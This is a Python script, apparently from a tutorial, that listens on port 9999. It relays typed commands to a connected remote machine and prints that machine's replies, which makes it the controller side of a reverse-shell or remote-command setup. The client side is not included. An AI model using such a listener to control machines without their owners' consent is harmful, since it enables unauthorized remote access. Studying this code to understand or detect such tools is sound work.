import socket
import sys


# creating a Socket Allows two computers to connect)

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


#bind socket to port and wait for connection from client

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding Socket to Port: " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding Error: " + str(msg) + "\n" + "Retrying....")
        socket_bind()

# Establishing a connection (Socket Must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been Established | " + "IP" +  address[0] + "| port" + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()